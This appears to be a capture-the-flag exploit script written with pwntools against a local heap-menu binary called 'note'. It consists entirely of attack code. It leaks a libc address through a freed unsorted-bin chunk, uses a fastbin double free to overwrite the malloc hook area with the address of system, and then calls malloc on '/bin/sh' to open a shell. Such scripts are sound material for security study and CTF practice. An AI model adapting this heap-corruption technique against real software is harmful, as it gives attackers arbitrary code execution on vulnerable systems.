from pwn import *

p = process("./note", env={"LD_PRELOAD": "./note_libc.so.6"})

elf = ELF("note")
libc = ELF("note_libc.so.6")


def add(size, content):
	p.sendlineafter("> \n", "1")
	p.sendlineafter(": ", str(size))
	p.sendlineafter(": ", content)

def delete(idx):
	p.sendlineafter("> \n", "3")
	p.sendlineafter(": ", str(idx))

def show(idx):
	p.sendlineafter("> \n", "2")
	p.sendlineafter(": ", str(idx))


add(0x500, "AAAA") # unsorted bin chunk 0
add(0x20, "BBBB")  # prevent top_chunk consolidation chunk 1


delete(0)

show(0)
p.recvline()
libc.address = u64(p.recv(6).ljust(8, b"\x00")) - 0x3c4b78
log.info(f"LIBC {hex(libc.address)}")


add(0x68, "BBBB")
add(0x68, "CCCC")

delete(2)
delete(3)
delete(2)


add(0x68, p64(libc.address + 0x3c4aed))
add(0x68, "EEEE")
add(0x68, "FFFF")

payload = b"\x00"*19
payload += p64(libc.symbols['system'])

add(0x68, payload)

p.sendlineafter("> \n", "1")
p.sendlineafter(": ", str(next(libc.search(b"/bin/sh\x00"))))
p.interactive()